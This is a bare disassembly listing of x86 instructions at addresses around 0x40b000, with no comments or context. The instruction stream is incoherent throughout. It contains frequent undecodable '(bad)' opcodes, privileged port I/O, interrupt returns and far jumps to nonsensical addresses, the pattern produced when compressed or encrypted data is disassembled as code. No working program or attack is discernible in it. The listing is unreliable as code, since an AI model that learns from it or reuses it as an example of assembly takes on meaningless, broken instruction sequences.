  40afdf:	fistp  WORD PTR [edx-0xf463ca]
  40afe5:	mov    al,ds:0xeb92b4e3
  40afea:	aaa    
  40afeb:	fxch   st(4)
  40afed:	push   eax
  40afee:	bound  edx,QWORD PTR [ebx+0x10]
  40aff1:	push   ebx
  40aff2:	pop    eax
  40aff3:	xor    DWORD PTR [esi],edi
  40aff5:	idiv   BYTE PTR [ebx]
  40aff7:	lds    ebp,FWORD PTR [esi+0x45]
  40affa:	loope  0x40b02f
  40affc:	pop    ss
  40affd:	add    eax,0xd0fddb4f
  40b002:	les    eax,FWORD PTR [eax+esi*8-0x1]
  40b006:	(bad)  
  40b007:	jp     0x40b014
  40b009:	fxch   st(7)
  40b00b:	pop    edx
  40b00c:	(bad)  
  40b00d:	daa    
  40b00e:	inc    esp
  40b00f:	inc    edx
  40b010:	xlat   BYTE PTR ds:[ebx]
  40b011:	xchg   edx,eax
  40b012:	xchg   esi,eax
  40b013:	mov    ebx,0xcc027b34
  40b018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b019:	nop    DWORD PTR [ebp+edi*8-0x34]
  40b01e:	push   DWORD PTR [esi+eiz*8-0x67]
  40b022:	repz in eax,dx
  40b024:	lds    ebx,FWORD PTR [edx-0x53245d54]
  40b02a:	push   ebp
  40b02b:	hlt    
  40b02c:	nop
  40b02d:	int3   
  40b02e:	rcr    BYTE PTR [eax+eiz*8-0x73],0x88
  40b033:	push   0xffffff8a
  40b035:	test   al,0xec
  40b037:	push   cs
  40b038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b039:	fdiv   DWORD PTR [edi+0x11]
  40b03c:	cli    
  40b03d:	sub    bh,BYTE PTR [ebx-0x5a14c0f8]
  40b043:	push   esi
  40b044:	mov    eax,0x8330c937
  40b049:	mov    esp,0x5c381b90
  40b04e:	cmp    BYTE PTR [edx-0x15],bh
  40b051:	and    eax,0xbfdf03e0
  40b056:	fs mov bh,0xad
  40b059:	iret   
  40b05a:	fistp  QWORD PTR [ebx-0x483104af]
  40b060:	push   0x1dde0ae
  40b065:	pusha  
  40b066:	loop   0x40b0a2
  40b068:	jge    0x40b02f
  40b06a:	fdivr  QWORD PTR ds:0x1e93a6a4
  40b070:	mov    eax,DWORD PTR [ebp-0xb]
  40b073:	and    esp,DWORD PTR [ecx-0x57765cd0]
  40b079:	push   ebx
  40b07a:	iret   
  40b07b:	pop    ss
  40b07c:	pop    esp
  40b07d:	arpl   WORD PTR [ebx+0x39],bx
  40b080:	int3   
  40b081:	popa   
  40b082:	jg     0x40b056
  40b084:	scas   al,BYTE PTR es:[edi]
  40b085:	es loop 0x40b0d4
  40b088:	pop    ss
  40b089:	aad    0x76
  40b08b:	icebp  
  40b08c:	cmp    ch,BYTE PTR [ecx-0x57ecdd7c]
  40b092:	jns    0x40b048
  40b094:	dec    ebp
  40b095:	pop    eax
  40b096:	gs or  eax,0xbe68f15b
  40b09c:	les    esp,FWORD PTR [edx]
  40b09e:	pop    eax
  40b09f:	push   0xb0c0c8e4
  40b0a4:	jecxz  0x40b096
  40b0a6:	fidivr WORD PTR [ecx]
  40b0a8:	lock rcl DWORD PTR [ecx+0x4d440b0f],0x3a
  40b0b0:	push   es
  40b0b1:	adc    eax,0x182a38bd
  40b0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b7:	pop    ds
  40b0b8:	pusha  
  40b0b9:	mov    esp,0xcb43b3cd
  40b0be:	push   0x48
  40b0c0:	stos   DWORD PTR es:[edi],eax
  40b0c1:	jb     0x40b0c4
  40b0c3:	adc    ebx,DWORD PTR [edi]
  40b0c5:	pop    ebp
  40b0c6:	pop    ecx
  40b0c7:	out    dx,al
  40b0c8:	push   edx
  40b0c9:	pop    ds
  40b0ca:	scas   al,BYTE PTR es:[edi]
  40b0cb:	jmp    0x1fe0:0x355a800d
  40b0d2:	ins    DWORD PTR es:[edi],dx
  40b0d3:	sti    
  40b0d4:	xor    BYTE PTR [edx+ebp*1-0x3e6f82ca],dh
  40b0db:	iret   
  40b0dc:	push   esp
  40b0dd:	out    0xc,al
  40b0df:	in     eax,0xc5
  40b0e1:	pop    ebp
  40b0e2:	inc    ebp
  40b0e3:	jae    0x40b108
  40b0e5:	or     BYTE PTR [ebx+0x43593b2a],cl
  40b0eb:	fidivr DWORD PTR [edi+0x74b84bf8]
  40b0f1:	fnstsw WORD PTR [edi+0x29]
  40b0f4:	adc    BYTE PTR [edi-0x64033a25],0xe7
  40b0fb:	jg     0x40b12b
  40b0fd:	dec    ebx
  40b0fe:	sub    edx,DWORD PTR [ebp+eiz*4-0x58f62e33]
  40b105:	add    eax,0xe6817858
  40b10a:	packuswb mm3,mm6
  40b10d:	push   ebp
  40b10e:	popa   
  40b10f:	sub    ebx,edi
  40b111:	and    DWORD PTR [ebp-0x77],ebx
  40b114:	dec    edi
  40b115:	cmp    ch,BYTE PTR [ebx+0x5f]
  40b118:	mov    BYTE PTR [edx+0xce21d7f],dl
  40b11e:	inc    eax
  40b11f:	loopne 0x40b19a
  40b121:	cmp    eax,0xb4007979
  40b126:	test   eax,0xbab966d3
  40b12b:	lds    edi,FWORD PTR [edx-0x4fb566c6]
  40b131:	ss add al,0x32
  40b134:	xchg   edi,eax
  40b135:	adc    al,0x5a
  40b137:	or     eax,0x935e5d38
  40b13c:	pop    esp
  40b13d:	ins    DWORD PTR es:[edi],dx
  40b13e:	jae    0x40b17d
  40b140:	arpl   sp,ax
  40b142:	jb     0x40b19a
  40b144:	jp     0x40b106
  40b146:	push   0x4c5816c8
  40b14b:	mov    eax,ds:0x41b77e3c
  40b150:	xchg   esi,eax
  40b152:	rcr    DWORD PTR [ebx+0x26a90508],0x6c
  40b159:	adc    BYTE PTR [esi-0x5f350bb],al
  40b15f:	pop    ebx
  40b160:	test   al,0x16
  40b162:	add    BYTE PTR [ecx+ebp*2],0x32
  40b166:	fst    QWORD PTR [ebp-0x2ef06639]
  40b16c:	mov    al,ds:0xafb077cc
  40b171:	fbld   TBYTE PTR [eax]
  40b173:	int    0xb
  40b175:	out    0xf1,al
  40b177:	loop   0x40b1b1
  40b179:	setle  BYTE PTR [ebx+edi*2-0x3a969563]
  40b181:	loopne 0x40b195
  40b183:	push   ebx
  40b184:	xchg   ebx,eax
  40b185:	loope  0x40b19c
  40b187:	and    eax,eax
  40b189:	push   edx
  40b18a:	xchg   edx,edx
  40b18c:	sahf   
  40b18d:	inc    edx
  40b18e:	ds clc 
  40b190:	mov    ds:0xad084800,al
  40b195:	repz mov bh,0x3c
  40b198:	lds    edx,FWORD PTR [eax-0x7]
  40b19b:	leave  
  40b19c:	(bad)  
  40b19d:	mov    esi,0xfe6e5b51
  40b1a2:	sub    edi,esp
  40b1a4:	in     al,dx
  40b1a5:	popa   
  40b1a6:	mov    edx,ebp
  40b1a8:	or     DWORD PTR [ebp-0x307d53b9],ecx
  40b1ae:	loop   0x40b201
  40b1b0:	stos   DWORD PTR es:[edi],eax
  40b1b1:	iret   
  40b1b2:	or     DWORD PTR [edx+edx*1+0x5c],ebp
  40b1b6:	in     eax,dx
  40b1b7:	push   ebp
  40b1b8:	pop    ss
  40b1b9:	and    dl,dh
  40b1bb:	add    al,0xbb
  40b1bd:	and    DWORD PTR [eax+0xb],esi
  40b1c0:	cmp    edx,DWORD PTR [eax-0x74a077a3]
  40b1c6:	push   0xfa1c6ec4
  40b1cb:	push   esp
  40b1cc:	xor    ebx,ebx
  40b1ce:	fdiv   QWORD PTR [esi-0x49]
  40b1d1:	xchg   BYTE PTR [ebp-0x19a6d2dc],dh
  40b1d7:	adc    DWORD PTR [edx-0x585c17ca],ebx
  40b1dd:	in     eax,0xb9
  40b1df:	and    al,0xf6
  40b1e1:	(bad)  
  40b1e3:	stos   DWORD PTR es:[edi],eax
  40b1e4:	xchg   esp,eax
  40b1e5:	and    eax,0xa3968317
  40b1ea:	in     al,dx
  40b1eb:	add    ch,BYTE PTR [edx-0x44]
  40b1ee:	outs   dx,DWORD PTR ds:[esi]
  40b1ef:	sub    DWORD PTR [eax+0x4e],ecx
  40b1f2:	ret    0x7a20
  40b1f5:	aam    0x68
  40b1f7:	bound  edi,QWORD PTR [ecx+0x1e]
  40b1fa:	inc    ecx
  40b1fb:	push   esp
  40b1fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1fd:	xchg   esi,eax
  40b1fe:	loopne 0x40b235
  40b200:	push   edx
  40b201:	mov    DWORD PTR [edx+0x6cba3c88],esp
  40b207:	xor    BYTE PTR [ebx+0x43794214],bl
  40b20d:	mov    cl,0x6e
  40b20f:	pop    esi
  40b210:	scas   eax,DWORD PTR es:[edi]
  40b211:	cmp    BYTE PTR [ecx+0x6b],ah
  40b214:	fs in  al,0x2d
  40b217:	xlat   BYTE PTR ds:[ebx]
  40b218:	push   ebx
  40b219:	and    DWORD PTR [ebx],0xffffff9a
  40b21c:	dec    edi
  40b21d:	es xchg edi,eax
  40b21f:	(bad)
  40b222:	ins    DWORD PTR es:[edi],dx
  40b223:	(bad)  
  40b224:	test   al,0xd7
  40b226:	mov    ebx,0xf86ab1cf
  40b22b:	cdq    
  40b22c:	pusha  
  40b22d:	bnd jl 0x40b255
  40b230:	outs   dx,BYTE PTR ds:[esi]
  40b231:	add    BYTE PTR [ecx+0x42],ah
  40b234:	xlat   BYTE PTR ds:[ebx]
  40b235:	jne    0x40b2a0
  40b237:	popf   
  40b238:	mov    edx,0xde2a4470
  40b23d:	xor    ecx,DWORD PTR [edx+0x2e8327b2]
  40b243:	lock mov ch,0xe8
  40b246:	out    0x71,al
  40b248:	and    BYTE PTR [ecx+0x6b],0x5
  40b24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b24d:	pusha  
  40b24e:	test   DWORD PTR [edi+0x47],ebx
  40b251:	retf   0x1e9a
  40b254:	imul   ecx,DWORD PTR [edi+edi*8],0x29
  40b258:	or     BYTE PTR [esp+edi*1],0x3b
  40b25c:	mov    ch,0xeb
  40b25e:	jmp    0x2300a742
  40b263:	inc    eax
  40b264:	jp     0x40b2df
  40b266:	sub    eax,0xbe0f69c6
  40b26b:	add    BYTE PTR [edi+0x61f725cd],al
  40b271:	jb     0x40b2ce
  40b273:	pop    ss
  40b274:	pop    ss
  40b275:	ret    0x7f71
  40b278:	int    0x9e
  40b27a:	push   esp
  40b27b:	sbb    ecx,eax
  40b27d:	adc    DWORD PTR [eax],0xffffffe9
  40b280:	sub    ebx,ecx
  40b282:	cmp    eax,0x2ff8144a
  40b287:	cmp    BYTE PTR [ecx+0x7c],al
  40b28a:	outs   dx,DWORD PTR ds:[esi]
  40b28b:	stos   BYTE PTR es:[edi],al
  40b28c:	pop    edi
  40b28d:	mov    edi,DWORD PTR [ebp-0x6d]
  40b290:	repnz fs aaa 
  40b293:	cmp    DWORD PTR [edx+0x296f74e6],0xfffffffa
  40b29a:	fisubr WORD PTR [eax+0x1e]
  40b29d:	in     eax,dx
  40b29e:	fstp   QWORD PTR [ebx-0x35]
  40b2a1:	and    DWORD PTR [edi-0x50121cfc],edi
  40b2a7:	loopne 0x40b26e
  40b2a9:	iret   
  40b2aa:	add    dh,0x1e
  40b2ad:	lock outs dx,BYTE PTR ds:[esi]
  40b2af:	rol    BYTE PTR [ebp+0x62],0x4d
  40b2b3:	cmp    ah,BYTE PTR [edi-0x1dbd2247]
  40b2b9:	fbstp  TBYTE PTR [esi]
  40b2bb:	dec    ecx
  40b2bc:	ins    DWORD PTR es:[edi],dx
  40b2bd:	sbb    DWORD PTR [ecx-0x38f6362e],0xda8a0ae7
  40b2c7:	imul   edi,esp,0xffffff8d
  40b2ca:	push   es
  40b2cb:	jno    0x40b2ae
  40b2cd:	adc    al,0x7a
  40b2cf:	rcl    DWORD PTR [edx+0x67589caf],0x63
  40b2d6:	aas    
  40b2d7:	fsub   st,st(5)
  40b2d9:	rol    ecx,1
  40b2db:	adc    al,BYTE PTR [ebp+0x45]
  40b2de:	fisub  WORD PTR [edi-0x6]
  40b2e1:	dec    eax
  40b2e2:	ret    0xc60a
  40b2e5:	fimul  WORD PTR [ebp-0xa487fd0]
  40b2eb:	scas   al,BYTE PTR es:[edi]
  40b2ec:	leave  
  40b2ed:	scas   eax,DWORD PTR es:[edi]
  40b2ee:	and    al,0xc
  40b2f0:	(bad)  
  40b2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f2:	ror    DWORD PTR [ebp+0x6634ad13],1
  40b2f8:	retf   0xa2f3
  40b2fb:	jns    0x40b2cd
  40b2fd:	enter  0xc56b,0x6a
  40b301:	fmul   DWORD PTR [esi]
  40b303:	sbb    dl,BYTE PTR [ecx+esi*1+0x20bc16a5]
  40b30a:	retf   
  40b30b:	ins    DWORD PTR es:[edi],dx
  40b30c:	ins    DWORD PTR es:[edi],dx
  40b30d:	dec    eax
  40b30e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b30f:	jnp    0x40b378
  40b311:	push   edx
  40b312:	and    dh,BYTE PTR [edi+0x6b]
  40b315:	mov    esp,?
  40b317:	stos   BYTE PTR es:[edi],al
  40b318:	or     eax,edx
  40b31a:	sahf   
  40b31b:	pop    esp
  40b31c:	inc    edi
  40b31d:	inc    ebx
  40b31e:	and    dl,BYTE PTR [eax+0x10]
  40b321:	inc    esp
  40b322:	icebp  
  40b323:	sub    DWORD PTR [esi],ebx
  40b325:	or     DWORD PTR [ecx+ebp*2-0x73],0xffffffad
  40b32a:	repnz mov ebx,0xf38db6c2
  40b330:	jecxz  0x40b39d
  40b332:	cmp    eax,0x48453dcf
  40b337:	sar    ecx,cl
  40b339:	mov    ch,0xa
  40b33b:	jge    0x40b325
  40b33d:	pop    di
  40b33f:	cmp    cl,BYTE PTR [edi+0x1f]
  40b342:	out    0xdd,eax
  40b344:	push   eax
  40b345:	icebp  
  40b346:	rcl    DWORD PTR [eax+0x3a],0x24
  40b34a:	xor    al,BYTE PTR [edi+0x22222cde]
  40b350:	jge    0x40b373
  40b352:	out    0xd3,al
  40b354:	and    BYTE PTR [esi-0x18],dl
  40b357:	test   eax,0x6053246f
  40b35c:	mov    ds:0x7719f2e5,eax
  40b361:	inc    ebp
  40b362:	push   ds
  40b363:	dec    esi
  40b364:	cwde   
  40b365:	leave  
  40b366:	fild   QWORD PTR [ebp-0x3d]
  40b369:	icebp  
  40b36a:	lea    ebp,[ebx+0x68]
  40b36d:	in     al,dx
  40b36e:	nop    DWORD PTR ds:0x4f88ed58
  40b375:	es inc eax
  40b377:	or     al,0xab
  40b379:	(bad)  
  40b37a:	pop    ebp
  40b37b:	shl    BYTE PTR [ebp+0x957eecd],1
  40b381:	scas   al,BYTE PTR es:[edi]
  40b382:	(bad)  
  40b383:	xchg   edx,eax
  40b384:	aaa    
  40b385:	pop    ebx
  40b386:	je     0x40b39a
  40b388:	fisttp WORD PTR [ecx]
  40b38a:	push   0x75
  40b38c:	adc    esp,edx
  40b38e:	inc    ebp
  40b38f:	je     0x40b37d
  40b391:	jg     0x40b400
  40b393:	and    edi,DWORD PTR [ecx+0x7]
  40b396:	idiv   ebx
  40b398:	and    ebx,DWORD PTR [ebx-0x23]
  40b39b:	aad    0xb0
  40b39d:	jmp    0x747b2ed4
  40b3a2:	xchg   edi,eax
  40b3a3:	or     edx,edi
  40b3a5:	lds    ebx,FWORD PTR [eax]
  40b3a7:	cs ss loop 0x40b3d1
  40b3ab:	sub    BYTE PTR [esp+ebp*4+0x2d925991],ch
  40b3b2:	sub    eax,0x34ab7a2a
  40b3b7:	cdq    
  40b3b8:	jae    0x40b436
  40b3ba:	mov    dh,0x51
  40b3bc:	fsub   st,st(0)
  40b3be:	or     eax,0x301ccf7d
  40b3c3:	mov    BYTE PTR [ecx+0x359cba69],ah
  40b3c9:	push   0x45c0fc71
  40b3ce:	lods   eax,DWORD PTR ds:[esi]
  40b3cf:	add    edx,ecx
  40b3d1:	add    edi,ebx
  40b3d3:	loopne 0x40b435
  40b3d5:	pop    es
  40b3d6:	fs push es
  40b3d8:	test   al,0x38
  40b3da:	jns    0x40b416
  40b3dc:	jecxz  0x40b360
  40b3de:	loopne 0x40b3c8
  40b3e0:	into   
  40b3e1:	dec    ebp
  40b3e2:	pop    ebx
  40b3e3:	cld    
  40b3e4:	jl     0x40b385
  40b3e6:	jecxz  0x40b464
  40b3e8:	xchg   bh,ch
  40b3ea:	jne    0x40b42d
  40b3ec:	dec    ebp
  40b3ed:	cmp    dh,al
  40b3ef:	loope  0x40b423
  40b3f1:	ss push ds
  40b3f3:	loop   0x40b398
  40b3f5:	dec    esp
  40b3f6:	ins    DWORD PTR es:[edi],dx
  40b3f7:	jecxz  0x40b451
  40b3f9:	fidivr DWORD PTR [ebp-0x36f96f1d]
  40b3ff:	mov    ecx,eax
  40b401:	call   0x175d:0x724a2832
  40b408:	mov    ch,0xa2
  40b40a:	test   al,0xaa
  40b40c:	and    eax,0x58d50713
  40b411:	cmc    
  40b412:	xchg   ebx,eax
  40b413:	lahf   
  40b414:	pop    edx
  40b415:	dec    esp
  40b416:	push   ebx
  40b417:	mov    edi,0x75377fd1
  40b41c:	adc    eax,0x8c9fa5f2
  40b421:	adc    ebp,DWORD PTR [eax-0x4b5c69b]
  40b427:	cli    
  40b428:	mov    dl,0xdd
  40b42a:	pusha  
  40b42b:	enter  0x778a,0xb
  40b42f:	fld    st(5)
  40b431:	cli    
  40b432:	push   ss
  40b433:	nop
  40b434:	mov    esp,0x71418a0c
  40b439:	inc    ebx
  40b43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43b:	xor    BYTE PTR [ecx],ah
  40b43d:	jmp    0xf00b0c96
  40b442:	jbe    0x40b414
  40b444:	mov    cl,0xbc
  40b446:	and    eax,0xdf600fbd
  40b44b:	push   edx
  40b44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b44d:	(bad)  
  40b44e:	outs   dx,DWORD PTR ds:[esi]
  40b44f:	mov    ebp,0x12b5c0bf
  40b454:	mov    dl,0x82
  40b456:	or     ecx,DWORD PTR [ebp-0x7948b031]
  40b45c:	fs imul esp,eax,0xc9c73f17
  40b463:	shr    esp,1
  40b465:	mov    bh,0xcb
  40b467:	mov    esp,0x2a35f45b
  40b46c:	mov    eax,ds:0x4c784b5c
  40b471:	sbb    ebp,DWORD PTR [ebx-0x31]
  40b474:	sub    bl,BYTE PTR [eax+eiz*4-0x7728922a]
  40b47b:	es push ebx
  40b47d:	int    0x9a
  40b47f:	push   0xffffffbe
  40b481:	adc    DWORD PTR [ebx+0x75d92c8],0xd34e2296
  40b48b:	pop    ebx
  40b48c:	dec    ecx
  40b48d:	cmp    ebp,DWORD PTR [ebx+0x5b8e4cec]
  40b493:	and    ebx,DWORD PTR [esp+esi*4]
  40b496:	popf   
  40b497:	std    
  40b498:	jno    0x40b4d8
  40b49a:	lds    ecx,FWORD PTR [edx+0x3151e5de]
  40b4a0:	imul   ebx,DWORD PTR [esi],0x8eaa785a
  40b4a6:	inc    esp
  40b4a7:	mov    eax,ds:0xc5c54360
  40b4ac:	(bad)  
  40b4ad:	iret   
  40b4ae:	dec    ebp
  40b4af:	in     eax,dx
  40b4b0:	inc    ebx
  40b4b1:	out    0x1d,al
  40b4b3:	jp     0x40b46e
  40b4b5:	mov    WORD PTR [edi],es
  40b4b7:	push   cs
  40b4b8:	cmp    BYTE PTR [edi+0x30a4a50a],ah
  40b4be:	pop    ds
  40b4bf:	jmp    0x4216a3d7
  40b4c4:	mov    edx,0x5ef852d5
  40b4c9:	pop    esp
  40b4ca:	stc    
  40b4cb:	xchg   ebx,eax
  40b4cc:	pop    ecx
  40b4cd:	add    ch,dh
  40b4cf:	cdq    
  40b4d0:	(bad)  [esi+0x17f3c66e]
  40b4d6:	fidiv  WORD PTR [edi-0x2b]
  40b4d9:	inc    eax
  40b4da:	call   0xc6a7edc
  40b4df:	push   0x211a8b7a
  40b4e4:	dec    ebp
  40b4e5:	mov    al,0x8
  40b4e7:	push   ecx
  40b4e8:	mov    al,ds:0xe6d81029
  40b4ed:	(bad)  
  40b4ef:	not    BYTE PTR ds:0x108ecd03
  40b4f5:	mov    bl,0xc1
  40b4f7:	mov    ebx,0xfa0ca00f
  40b4fc:	xor    DWORD PTR [ecx],edx
  40b4fe:	stc    
  40b4ff:	cmp    al,0x4
  40b501:	inc    eax
  40b502:	sahf   
  40b503:	ins    BYTE PTR es:[edi],dx
  40b504:	xchg   DWORD PTR [ecx],eax
  40b506:	pop    edx
  40b507:	test   DWORD PTR [eax+ebx*2-0x49c0669b],esp
  40b50e:	add    dl,bl
  40b510:	loope  0x40b578
  40b512:	add    al,0x53
  40b514:	push   esi
  40b515:	mov    esi,0xa5a13492
  40b51a:	jl     0x40b4da
  40b51c:	dec    esi
  40b51d:	jmp    0x8a63905a
  40b522:	xchg   esi,eax
  40b523:	adc    eax,0xd59ce0cf
  40b528:	ret    0x9142
  40b52b:	inc    edi
  40b52c:	std    
  40b52d:	jl     0x40b5ac
  40b52f:	(bad)  
  40b530:	jmp    0xba92c2f9
  40b535:	test   DWORD PTR [esi+0x75],ecx
  40b538:	and    DWORD PTR [edx-0x270e22e2],edx
  40b53e:	pop    ds
  40b53f:	loopne 0x40b4dc
  40b541:	add    DWORD PTR [ecx+0x25],edi
  40b544:	shl    BYTE PTR [esi-0x5a],0x93
  40b548:	xor    ebx,DWORD PTR [ecx-0x4e]
  40b54b:	add    ah,BYTE PTR [ebp+0x731fc5f7]
  40b551:	jns    0x40b507
  40b553:	fsub   QWORD PTR [ebp-0x3e6facf6]
  40b559:	(bad)  
  40b55a:	jg     0x40b584
  40b55c:	popa   
  40b55d:	xlat   BYTE PTR ds:[ebx]
  40b55e:	call   0xcd9a09ec
  40b563:	jmp    0x40b5d4
  40b565:	and    BYTE PTR [ebp-0x34],bh
  40b568:	pusha  
  40b569:	retf   
  40b56a:	pop    ds
  40b56b:	push   es
  40b56c:	shl    DWORD PTR [esi+0x2ac6de],0x35
  40b573:	xor    eax,0x5c27f792
  40b578:	mov    cl,0x4d
  40b57a:	lods   eax,DWORD PTR ds:[esi]
  40b57b:	not    edx
  40b57d:	clc    
  40b57e:	dec    ecx
  40b57f:	rcr    BYTE PTR [eax+ecx*2-0x2a29ded5],1
  40b586:	sbb    al,BYTE PTR [ecx]
  40b588:	xor    al,0xa1
  40b58a:	cmp    bh,BYTE PTR [eax+esi*2]
  40b58d:	gs or  al,0xe5
  40b590:	cwde   
  40b591:	aaa    
  40b592:	jmp    0x39f38a85
  40b597:	dec    ebp
  40b598:	fstp   DWORD PTR [edi+0x44]
  40b59b:	cld    
  40b59c:	mov    cl,0xb3
  40b59e:	mov    al,ds:0x77d85382
  40b5a3:	call   0xafb6:0x3ea66ab
  40b5aa:	stos   DWORD PTR es:[edi],eax
  40b5ab:	outs   dx,DWORD PTR ds:[esi]
  40b5ac:	sahf   
  40b5ad:	aam    0x4b
  40b5af:	js     0x40b5a7
  40b5b1:	mov    ah,0xb9
  40b5b3:	xor    BYTE PTR [eax-0x3efecf4b],0xfa
  40b5ba:	sahf   
  40b5bb:	test   DWORD PTR [ebx-0x11],eax
  40b5be:	repz mov dl,0xc1
  40b5c1:	loope  0x40b62d
  40b5c3:	push   edi
  40b5c4:	das    
  40b5c5:	imul   edx,DWORD PTR [edx-0x13],0x49
  40b5c9:	and    eax,0x8cc9ae6f
  40b5ce:	das    
  40b5cf:	fstp   TBYTE PTR [esp+eiz*2]
  40b5d2:	daa    
  40b5d3:	pop    ss
  40b5d4:	inc    edx
  40b5d5:	adc    BYTE PTR [esp+eax*2+0x3b],bh
  40b5d9:	inc    eax
  40b5da:	sub    BYTE PTR [edx+0x2fd0f5cb],ch
  40b5e0:	mov    edx,DWORD PTR [edx+0x15]
  40b5e3:	pop    esi
  40b5e4:	xor    BYTE PTR [esi],0x6b
  40b5e7:	lea    ecx,[edi+0x79]
  40b5ea:	lods   al,BYTE PTR ds:[esi]
  40b5eb:	jnp    0x40b628
  40b5ed:	mov    bh,0xed
  40b5ef:	pop    ds
  40b5f0:	sub    BYTE PTR [edi+0x410b79fb],0xf1
  40b5f7:	xchg   ebp,eax
  40b5f8:	mov    WORD PTR [edx+0x6849ce1e],ss
  40b5fe:	mov    eax,ds:0x42cdac8a
  40b603:	les    ebx,FWORD PTR [ecx-0x29]
  40b606:	or     ebp,DWORD PTR [edx+0x1a4cda6c]
  40b60c:	jle    0x40b5a2
  40b60e:	push   es
  40b60f:	pusha  
  40b610:	(bad)  
  40b611:	rol    DWORD PTR [eax+0x67],cl
  40b614:	sti    
  40b615:	je     0x40b659
  40b617:	mov    ebx,0xb7993a93
  40b61c:	xchg   ecx,eax
  40b61d:	fnstsw WORD PTR [eax+0x3da43b0e]
  40b623:	icebp  
  40b624:	and    BYTE PTR [ebx-0x7352c441],dl
  40b62a:	jne    0x40b65e
  40b62c:	sbb    al,0x19
  40b62e:	mov    ebx,0xb22fe13f
  40b633:	nop
  40b634:	xor    BYTE PTR [eax],cl
  40b636:	loop   0x40b639
  40b638:	shr    BYTE PTR ds:0x38b54497,cl
  40b63e:	or     ebx,DWORD PTR [ecx+0x26a42f0]
  40b644:	xlat   BYTE PTR ds:[ebx]
  40b645:	mov    ds:0x6bf6a118,al
  40b64a:	lds    eax,FWORD PTR [edx+0x67]
  40b64d:	lods   al,BYTE PTR ds:[esi]
  40b64e:	jmp    0xea2d307a
  40b653:	push   cs
  40b654:	mov    dh,0xb7
  40b656:	std    
  40b657:	ins    BYTE PTR es:[edi],dx
  40b658:	jl     0x40b624
  40b65a:	push   ebp
  40b65b:	cld    
  40b65c:	fld    DWORD PTR [ebx-0x1d]
  40b65f:	mov    al,0xd0
  40b661:	fdivp  st(6),st
  40b663:	mov    eax,ds:0x8856853d
  40b668:	pop    ebp
  40b669:	fisttp QWORD PTR [edi-0x562e4d3f]
  40b66f:	inc    eax
  40b670:	out    0xa,eax
  40b672:	pusha  
  40b673:	mov    ebx,0xd45888a7
  40b678:	inc    esi
  40b679:	add    eax,0xf1836620
  40b67e:	mov    esp,0xabf72007
  40b683:	aaa    
  40b684:	sbb    dl,0x8e
  40b687:	daa    
  40b688:	add    al,0x9a
  40b68a:	xor    BYTE PTR [ebx],dh
  40b68c:	mov    BYTE PTR [edi+edi*1+0x6badca47],al
  40b693:	out    0x2d,eax
  40b695:	stos   DWORD PTR es:[edi],eax
  40b696:	jmp    0x64d784f9
  40b69b:	mov    DWORD PTR [edi-0x2c00df67],esi
  40b6a1:	mov    ds:0x41c2bfb0,al
  40b6a6:	test   BYTE PTR [edi+0x79a3d11],ch
  40b6ac:	icebp  
  40b6ad:	jg     0x40b659
  40b6af:	std    
  40b6b0:	inc    edx
  40b6b1:	inc    eax
  40b6b2:	in     eax,0x31
  40b6b4:	sahf   
  40b6b5:	retf   0x7e2a
  40b6b8:	jno    0x40b70c
  40b6ba:	pusha  
  40b6bb:	out    0xc5,al
  40b6bd:	dec    ebp
  40b6be:	xchg   esi,eax
  40b6bf:	dec    esp
  40b6c0:	inc    ebx
  40b6c1:	lods   eax,DWORD PTR ds:[esi]
  40b6c2:	test   eax,0x26ea7b8c
  40b6c7:	mov    bl,0xb0
  40b6c9:	push   cs
  40b6ca:	pcmpgtw mm7,QWORD PTR [esi-0x3f]
  40b6ce:	ret    
  40b6cf:	dec    eax
  40b6d0:	hlt    
  40b6d1:	mov    ebp,0x95d08d4c
  40b6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d7:	jle    0x40b6bf
  40b6d9:	jo     0x40b6e1
  40b6db:	mov    ecx,0x9ad57ecc
  40b6e0:	les    ebx,FWORD PTR [esi+0x2e2a4e15]
  40b6e6:	imul   ebp,DWORD PTR [ecx+edi*4+0x75],0x19c22519
  40b6ee:	add    DWORD PTR [edi+0x2963705],edi
  40b6f4:	or     al,0xe9
  40b6f6:	loope  0x40b698
  40b6f8:	inc    ebp
  40b6f9:	nop
  40b6fa:	pusha  
  40b6fb:	inc    esi
  40b6fc:	push   cs
  40b6fd:	outs   dx,BYTE PTR ds:[esi]
  40b6fe:	push   ebp
  40b6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b700:	lods   al,BYTE PTR ds:[esi]
  40b701:	pop    ebp
  40b702:	mov    edx,0x76fcc854
  40b707:	and    al,0xd9
  40b709:	sub    ecx,edi
  40b70b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70c:	daa    
  40b70d:	lods   eax,DWORD PTR ds:[esi]
  40b70e:	xor    eax,0x92398f15
  40b713:	push   eax
  40b714:	jmp    0x40b719
  40b716:	push   0x37
  40b718:	neg    BYTE PTR [ecx]
  40b71a:	stc    
  40b71b:	push   esi
  40b71c:	xchg   edx,eax
  40b71d:	ja     0x40b72d
  40b71f:	aas    
  40b720:	sbb    eax,0x3948db27
  40b725:	repnz inc edx
  40b727:	aad    0xbb
  40b729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72a:	add    esp,esi
  40b72c:	push   edx
  40b72d:	mov    esp,0xd7b942c2
  40b732:	jb     0x40b7ae
  40b734:	and    al,ch
  40b736:	test   ebx,esi
  40b738:	das    
  40b739:	ficomp WORD PTR [bp+di+0x7e]
  40b73d:	(bad)  
  40b73e:	popf   
  40b73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b740:	push   ss
  40b741:	mov    bl,BYTE PTR [eax-0x22223141]
  40b747:	(bad)
  40b74a:	push   edi
  40b74b:	aam    0xa0
  40b74d:	inc    ebp
  40b74e:	add    DWORD PTR [edi],esi
  40b750:	cmp    ebx,ebx
  40b752:	ror    BYTE PTR [esi],1
  40b754:	out    dx,al
  40b755:	ja     0x40b713
